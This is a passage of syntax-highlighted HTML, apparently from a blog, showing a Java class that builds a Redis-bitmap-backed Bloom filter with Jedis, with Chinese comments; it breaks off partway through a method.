data-line=\"crayon-5a6f39e8bb1cd810444680-64\">64</div><div class=\"crayon-num\" data-line=\"crayon-5a6f39e8bb1cd810444680-65\">65</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f39e8bb1cd810444680-66\">66</div><div class=\"crayon-num\" data-line=\"crayon-5a6f39e8bb1cd810444680-67\">67</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f39e8bb1cd810444680-68\">68</div><div class=\"crayon-num\" data-line=\"crayon-5a6f39e8bb1cd810444680-69\">69</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f39e8bb1cd810444680-70\">70</div><div class=\"crayon-num\" data-line=\"crayon-5a6f39e8bb1cd810444680-71\">71</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f39e8bb1cd810444680-72\">72</div><div class=\"crayon-num\" data-line=\"crayon-5a6f39e8bb1cd810444680-73\">73</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f39e8bb1cd810444680-74\">74</div><div class=\"crayon-num\" data-line=\"crayon-5a6f39e8bb1cd810444680-75\">75</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f39e8bb1cd810444680-76\">76</div><div class=\"crayon-num\" data-line=\"crayon-5a6f39e8bb1cd810444680-77\">77</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f39e8bb1cd810444680-78\">78</div><div class=\"crayon-num\" data-line=\"crayon-5a6f39e8bb1cd810444680-79\">79</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f39e8bb1cd810444680-80\">80</div><div class=\"crayon-num\" data-line=\"crayon-5a6f39e8bb1cd810444680-81\">81</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f39e8bb1cd810444680-82\">82</div><div class=\"crayon-num\" data-line=\"crayon-5a6f39e8bb1cd810444680-83\">83</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f39e8bb1cd810444680-84\">84</div><div class=\"crayon-num\" data-line=\"crayon-5a6f39e8bb1cd810444680-85\">85</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f39e8bb1cd810444680-86\">86</div><div class=\"crayon-num\" data-line=\"crayon-5a6f39e8bb1cd810444680-87\">87</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f39e8bb1cd810444680-88\">88</div><div class=\"crayon-num\" data-line=\"crayon-5a6f39e8bb1cd810444680-89\">89</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f39e8bb1cd810444680-90\">90</div><div class=\"crayon-num\" data-line=\"crayon-5a6f39e8bb1cd810444680-91\">91</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f39e8bb1cd810444680-92\">92</div><div class=\"crayon-num\" data-line=\"crayon-5a6f39e8bb1cd810444680-93\">93</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f39e8bb1cd810444680-1\"><span class=\"crayon-t\">class</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">RedisBitmaps</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f39e8bb1cd810444680-2\"> </div><div class=\"crayon-line\" id=\"crayon-5a6f39e8bb1cd810444680-3\"><span class=\"crayon-h\">    </span><span class=\"crayon-m\">private</span><span class=\"crayon-h\"> </span><span class=\"crayon-m\">static</span><span class=\"crayon-h\"> </span><span class=\"crayon-m\">final</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">String</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">BASE_KEY</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"bloomfilter\"</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f39e8bb1cd810444680-4\"><span class=\"crayon-h\">    </span><span class=\"crayon-m\">private</span><span class=\"crayon-h\"> </span><span class=\"crayon-m\">static</span><span class=\"crayon-h\"> </span><span class=\"crayon-m\">final</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">String</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">CURSOR</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"cursor\"</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f39e8bb1cd810444680-5\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f39e8bb1cd810444680-6\"><span class=\"crayon-h\">    </span><span class=\"crayon-m\">private</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">JedisUtils </span><span class=\"crayon-v\">jedisUtils</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f39e8bb1cd810444680-7\"><span class=\"crayon-h\">    </span><span class=\"crayon-m\">private</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">long</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">bitSize</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f39e8bb1cd810444680-8\"> </div><div class=\"crayon-line\" id=\"crayon-5a6f39e8bb1cd810444680-9\"><span class=\"crayon-h\">    </span><span class=\"crayon-e\">RedisBitmaps</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">long</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">bits</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f39e8bb1cd810444680-10\"><span class=\"crayon-h\">        </span><span class=\"crayon-r\">this</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">jedisUtils</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-r\">new</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">JedisUtils</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f39e8bb1cd810444680-11\"><span class=\"crayon-h\">        </span><span class=\"crayon-r\">this</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">bitSize</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">LongMath</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">divide</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">bits</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">64</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">RoundingMode</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">CEILING</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">*</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">Long</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">SIZE</span><span class=\"crayon-sy\">;</span><span class=\"crayon-c\">//位数组的长度，相当于n个long的长度</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f39e8bb1cd810444680-12\"><span class=\"crayon-h\">        </span><span class=\"crayon-st\">if</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-e\">bitCount</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">==</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5a6f39e8bb1cd810444680-13\"><span class=\"crayon-h\">            </span><span class=\"crayon-v\">jedisUtils</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">execute</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">jedis</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">jedis</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">setbit</span><span class=\"crayon-sy\">(</span><span class=\"crayon-e\">currentKey</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">bitSize</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">false</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f39e8bb1cd810444680-14\"><span class=\"crayon-h\">        </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5a6f39e8bb1cd810444680-15\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f39e8bb1cd810444680-16\"> </div><div class=\"crayon-line\" id=\"crayon-5a6f39e8bb1cd810444680-17\"><span class=\"crayon-h\">   </span><span class=\"crayon-t\">boolean</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">get</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">long</span><span class=\"crayon-sy\">[</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">offsets</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f39e8bb1cd810444680-18\"><span class=\"crayon-h\">        </span><span class=\"crayon-st\">for</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">long</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">cursor</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">+</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-o\">++</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5a6f39e8bb1cd810444680-19\"><span class=\"crayon-h\">            </span><span class=\"crayon-m\">final</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">long</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">cursor</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f39e8bb1cd810444680-20\"><span class=\"crayon-h\">            </span><span class=\"crayon-c\">//只要有一个cursor对应的bitmap中，offsets全部命中，则表示可能存在</span></div><div class=\"crayon-line\" id=\"crayon-5a6f39e8bb1cd810444680-21\"><span class=\"crayon-h\">            </span><span class=\"crayon-t\">boolean</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">match</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">Arrays</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">stream</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">offsets</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">boxed</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f39e8bb1cd810444680-22\"><span class=\"crayon-h\">                    </span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">map</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">offset</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">jedisUtils</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">execute</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">jedis</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">jedis</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">getbit</span><span class=\"crayon-sy\">(</span><span class=\"crayon-e\">genkey</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">cursor</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">offset</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5a6f39e8bb1cd810444680-23\"><span class=\"crayon-h\">                    </span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">allMatch</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">b</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">Boolean</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">b</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f39e8bb1cd810444680-24\"><span class=\"crayon-h\">            </span><span class=\"crayon-st\">if</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">match</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5a6f39e8bb1cd810444680-25\"><span class=\"crayon-h\">                </span><span class=\"crayon-st\">return</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">true</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f39e8bb1cd810444680-26\"><span class=\"crayon-h\">        </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5a6f39e8bb1cd810444680-27\"><span class=\"crayon-h\">        </span><span class=\"crayon-st\">return</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">false</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f39e8bb1cd810444680-28\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5a6f39e8bb1cd810444680-29\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f39e8bb1cd810444680-30\"><span class=\"crayon-h\">    </span><span class=\"crayon-t\">boolean</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">get</span><span class=\"crayon-sy\">(</span><span class=\"crayon-m\">final</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">long</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">offset</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5a6f39e8bb1cd810444680-31\"><span class=\"crayon-h\">        </span><span class=\"crayon-st\">return</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">jedisUtils</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">execute</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">jedis</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">jedis</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">getbit</span><span class=\"crayon-sy\">(</span><span class=\"crayon-e\">currentKey</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">offset</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f39e8bb1cd810444680-32\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5a6f39e8bb1cd810444680-33\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f39e8bb1cd810444680-34\"><span class=\"crayon-h\">    </span><span class=\"crayon-t\">boolean</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">set</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">long</span><span class=\"crayon-sy\">[</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">offsets</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5a6f39e8bb1cd810444680-35\"><span class=\"crayon-h\">        </span><span class=\"crayon-st\">if</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-e\">cursor</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&amp;&amp;</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">get</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">offsets</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f39e8bb1cd810444680-36\"><span class=\"crayon-h\">            </span><span class=\"crayon-st\">return</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">false</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f39e8bb1cd810444680-37\"><span class=\"crayon-h\">        </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f39e8bb1cd810444680-38\"><span class=\"crayon-h\">        </span><span class=\"crayon-t\">boolean</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">bitsChanged</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">false</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f39e8bb1cd810444680-39\"><span class=\"crayon-h\">        </span><span class=\"crayon-st\">for</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">long</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">offset</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">offsets</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f39e8bb1cd810444680-40\"><span class=\"crayon-h\">            </span><span class=\"crayon-v\">bitsChanged</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|=</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">set</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">offset</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f39e8bb1cd810444680-41\"><span class=\"crayon-h\">        </span><span class=\"crayon-st\">return</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">bitsChanged</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f39e8bb1cd810444680-42\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5a6f39e8bb1cd810444680-43\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f39e8bb1cd810444680-44\"><span class=\"crayon-h\">    </span><span class=\"crayon-t\">boolean</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">set</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">long</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">offset</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5a6f39e8bb1cd810444680-45\"><span class=\"crayon-h\">        </span><span class=\"crayon-st\">if</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-o\">!</span><span class=\"crayon-e\">get</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">offset</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f39e8bb1cd810444680-46\"><span class=\"crayon-h\">            </span><span class=\"crayon-v\">jedisUtils</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">execute</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">jedis</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">jedis</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">setbit</span><span class=\"crayon-sy\">(</span><span class=\"crayon-e\">currentKey</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">offset</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">true</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f39e8bb1cd810444680-47\"><span class=\"crayon-h\">            </span><span class=\"crayon-st\">return</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">true</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f39e8bb1cd810444680-48\"><span class=\"crayon-h\">        </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5a6f39e8bb1cd810444680-49\"><span class=\"crayon-h\">        </span><span class=\"crayon-st\">return</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">false</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f39e8bb1cd810444680-50\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5a6f39e8bb1cd810444680-51\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f39e8bb1cd810444680-52\"><span class=\"crayon-h\">    </span><span class=\"crayon-t\">long</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">bitCount</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5a6f39e8bb1cd810444680-53\"><span class=\"crayon-h\">        </span><span class=\"crayon-st\">return</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">jedisUtils</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">execute</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">jedis</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">jedis</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">bitcount</span><span class=\"crayon-sy\">(</span><span class=\"crayon-e\">currentKey</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f39e8bb1cd810444680-54\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5a6f39e8bb1cd810444680-55\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f39e8bb1cd810444680-56\"><span class=\"crayon-h\">    </span><span class=\"crayon-t\">long</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">bitSize</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5a6f39e8bb1cd810444680-57\"><span class=\"crayon-h\">        </span><span class=\"crayon-st\">return</span><span class=\"crayon-h\"> </span><span class=\"crayon-r\">this</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">bitSize</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f39e8bb1cd810444680-58\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5a6f39e8bb1cd810444680-59\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f39e8bb1cd810444680-60\"><span class=\"crayon-h\">    </span><span class=\"crayon-m\">private</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">String</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">currentKey</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5a6f39e8bb1cd810444680-61\"><span class=\"crayon-h\">        </span><span class=\"crayon-st\">return</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">genkey</span><span class=\"crayon-sy\">(</span><span class=\"crayon-e\">cursor</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f39e8bb1cd810444680-62\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5a6f39e8bb1cd810444680-63\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f39e8bb1cd810444680-64\"><span class=\"crayon-h\">    </span><span class=\"crayon-m\">private</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">String</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">genkey</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">long</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">cursor</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5a6f39e8bb1cd810444680-65\"><span class=\"crayon-h\">        </span><span class=\"crayon-st\">return</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">BASE_KEY</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">+</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"-\"</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">+</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">cursor</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f39e8bb1cd810444680-66\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5a6f39e8bb1cd810444680-67\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f39e8bb1cd810444680-68\"><span class=\"crayon-h\">    </span><span class=\"crayon-m\">private</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">Long</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">cursor</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5a6f39e8bb1cd810444680-69\"><span class=\"crayon-h\">        </span><span class=\"crayon-t\">String</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">cursor</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">jedisUtils</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">execute</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">jedis</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">jedis</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">get</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">CURSOR</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f39e8bb1cd810444680-70\"><span class=\"crayon-h\">        </span><span class=\"crayon-st\">return</span><span class=\"crayon-h\"> </span><span 